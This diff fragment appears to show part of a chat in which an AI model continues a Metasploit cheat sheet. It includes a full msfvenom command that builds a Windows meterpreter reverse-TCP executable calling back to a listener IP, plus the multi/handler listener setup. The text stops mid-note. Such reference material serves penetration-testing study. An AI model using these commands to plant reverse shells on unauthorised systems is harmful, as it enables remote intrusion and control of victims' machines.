@@ -36,3 +36,21 @@ Explain briefly and create a cheat sheet table for commands
 ｜　Payload Generation ｜　msfvenom -p [
 
 continue the above table
+
+
+Here’s the completed **MSFConsole Cheat Sheet** table with additional essential commands, including payload generation and post-exploitation:  
+
+---
+
+### **Cheat Sheet Table (Continued)**  
+
+｜　Payload Generation ｜　`msfvenom -p [payload] LHOST=[IP] LPORT=[port] -f [format] > [file]` ｜ Generate a payload (e.g., `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > payload.exe`)． ｜
+｜　Listener Setup      ｜　`use exploit/multi/handler` ｜ Set up a listener for incoming connections． ｜
+｜                     ｜　`set PAYLOAD [payload_path]` ｜ Match payload to generated file (e.g., `windows/x64/meterpreter/reverse_tcp`)． |
+
+---
+
+### **Key Notes:**  
+1. **Payload Generation**:  
+   - Use `msfvenom` (outside `msfconsole`) to create standalone payloads (e.g., `.exe`, `.apk`, `.php`).  
+   Example:
